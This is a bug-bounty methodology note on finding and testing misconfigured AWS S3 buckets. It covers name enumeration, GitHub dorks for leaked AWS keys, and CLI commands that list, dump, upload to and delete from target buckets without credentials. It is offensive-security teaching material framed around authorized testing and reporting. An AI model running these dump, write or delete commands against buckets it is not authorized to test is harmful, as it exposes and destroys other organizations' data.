---
title: "S3 Bucket Misconfiguration"
type: technique
tags: [s3, aws, cloud, misconfiguration, bug-bounty, recon]
created: 2026-08-17
updated: 2026-08-17
sources: []
related: ["[[aws]]", "[[firebase-security]]", "[[api-key-exposure]]", "[[secrets-exposure]]"]
status: active
---

# S3 Bucket Misconfiguration

## Overview

Misconfigured S3 buckets expose sensitive data publicly or allow unauthorized users to upload, modify, or delete files. It is one of the most frequent cloud vulnerabilities in bug bounty programs.

## Impact

- Exposure of sensitive data (PII, credentials, backups, source code)
- Upload of malicious files (defacement, malware hosting)
- Data deletion (availability)
- Access to internal organization files
- CVSS: 5.3 (public read) to 9.1 (public write/delete)

## Where to look

- Subdomains matching `*.s3.amazonaws.com` or `s3.amazonaws.com/<name>`
- URLs in JS source code, APKs, config files
- HTTP response headers referencing S3
- Predictable names: `company-backup`, `company-assets`, `company-dev`, `company-staging`
- Upload parameters in APIs referencing S3 buckets

## Methodology

### Step 1 - AWS CLI setup

```bash
# Create a free AWS account to use the CLI
aws configure
# Access Key ID: <your_key>
# Secret Access Key: <your_secret>
# Region: us-east-1
# Output: json
```

For unauthenticated tests (public bucket):
```bash
aws s3 ls s3://bucket-name --no-sign-request
```

### Step 2 - Bucket enumeration

```bash
# Check whether a bucket exists and is public
aws s3 ls s3://company-backup --no-sign-request
aws s3 ls s3://company.backup --no-sign-request
aws s3 ls s3://company-dev --no-sign-request

# Access via URL directly
curl https://s3.amazonaws.com/bucket-name/
curl https://bucket-name.s3.amazonaws.com/
```

### Step 3 - Test permissions

```bash
# Read (LIST)
aws s3 ls s3://target-bucket --no-sign-request

# Download a specific file
aws s3 cp s3://target-bucket/file.txt ./ --no-sign-request

# Upload (write) - PoC for bug bounty
echo "pentest-poc" > poc.txt
aws s3 cp poc.txt s3://target-bucket/pentest-poc.txt --no-sign-request

# Delete - do NOT run in production without explicit authorization
aws s3 rm s3://target-bucket/file.txt --no-sign-request

# Full dump (use with caution)
aws s3 sync s3://target-bucket ./ --no-sign-request
```

### Step 4 - Check ACLs and policies

```bash
# Check bucket ACL (requires authentication)
aws s3api get-bucket-acl --bucket bucket-name

# Check bucket policy
aws s3api get-bucket-policy --bucket bucket-name

# Check whether bucket logging is enabled
aws s3api get-bucket-logging --bucket bucket-name
```

### Step 5 - Search for sensitive content

```bash
# After listing, look for:
# - *.sql, *.bak, *.tar.gz, *.zip (backups)
# - .env, config.*, credentials.* (credentials)
# - *.pem, *.key, id_rsa (private keys)
# - *.pdf, *.xlsx with personal data (PII)
```

## Automation tools

| Tool | Use |
|------|-----|
| S3Scanner | Scanning misconfigured buckets at scale |
| Lazy S3 | Fast bucket enumeration by name |
| bucket_finder | Bucket-name brute force |
| awsbucketdump | Dump of credentials in buckets |
| DumpsterDiver | Search for secrets in bucket dumps |
| s3-buckets-finder | Keyword-based enumeration |

```bash
# S3Scanner
s3scanner scan --buckets-file buckets.txt

# Lazy S3
lazy-s3 -l company-name

# bucket_finder
bucket_finder wordlist.txt --region us-east-1
```

## Wordlist names

```
company
company-backup
company-assets
company-static
company-media
company-uploads
company-dev
company-staging
company-prod
company-logs
company-data
company-internal
company-private
company-public
```

## Payloads

Write-permission verification for a PoC:
```bash
echo "bug-bounty-poc-$(date +%s)" > /tmp/poc.txt
aws s3 cp /tmp/poc.txt s3://target-bucket/pentest/poc-$(date +%s).txt --no-sign-request
# If successful: report as public write
# Delete after confirming:
aws s3 rm s3://target-bucket/pentest/poc-*.txt --no-sign-request
```

## Common bypasses

- Bucket with a public ACL but restrictive policy: test unauthenticated (`--no-sign-request`).
- Signed URLs: try to modify the expiry, replace the referenced object.
- Private bucket but public objects: enumerate common object names.

## Report tips

- Document exactly which permissions are open (LIST, GET, PUT, DELETE).
- List the types of exposed data (PII, credentials, backups).
- Calculate impact: how many records, what kind of data.
- Include write/delete evidence only with a non-destructive PoC.
- Recommend: enable Block Public Access, review ACLs and bucket policies, enable CloudTrail.

## Additional discovery

### GitHub dorks for S3 buckets

```
org:target "amazonaws"
org:target "bucket_name"
org:target "aws_access_key"
org:target "S3_BUCKET"
```

### Extract S3 URLs from JavaScript

```bash
wget https://target.com/app.js -O app.js
grep -Eo 'https?://[a-z0-9.-]+\.s3[.-][a-z0-9.-]*\.amazonaws\.com[^"'\'']*' app.js
```

### Public-bucket search sites

- https://buckets.grayhatwarfare.com/
- https://osint.sh/buckets/

## References

- https://github.com/sa7mon/S3Scanner
- https://github.com/koenrh/s3enum
- https://github.com/gwen001/s3-buckets-finder
- https://labs.detectify.com/writeups/bypassing-and-exploiting-bucket-upload-policies-and-signed-urls/
- https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-overview.html
